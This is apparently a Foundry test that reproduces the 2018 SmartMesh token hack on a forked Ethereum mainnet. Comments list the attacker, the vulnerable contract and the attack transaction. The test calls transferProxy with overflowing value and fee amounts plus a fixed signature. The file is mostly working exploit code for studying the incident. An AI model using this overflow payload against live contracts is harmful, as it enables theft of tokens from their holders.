// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 140M
// Attacker : https://etherscan.io/address/0xd6a09bdb29e1eafa92a30373c44b09e2e2e0651e
// Vulnerable Contract : https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081
// Attack Tx : https://etherscan.io/tx/0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081#code

// @Analysis
// Post-mortem : https://cryptojobslist.com/blog/two-vulnerable-erc20-contracts-deep-dive-beautychain-smartmesh
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

interface ISmartMesh {
    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeSmt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external returns (bool);
}

contract SmartMesh is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 5_499_034;

    address internal Victim = 0x55F93985431Fc9304077687a35A1BA103dC1e081;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0x55F93985431Fc9304077687a35A1BA103dC1e081);
    }

    function testExploit() public balanceLog {
        address _from = 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F;
        address _to = 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F;
        uint256 _value = uint256(0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        uint256 _feeSmt = uint256(0x7000000000000000000000000000000000000000000000000000000000000001);
        uint8 _v = uint8(0x000000000000000000000000000000000000000000000000000000000000001b);
        bytes32 _r = 0x87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799;
        bytes32 _s = 0x6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8;
        ISmartMesh(Victim).transferProxy(
            _from,
            _to,
            _value,
            _feeSmt,
            _v,
            _r,
            _s
        );
    }
}
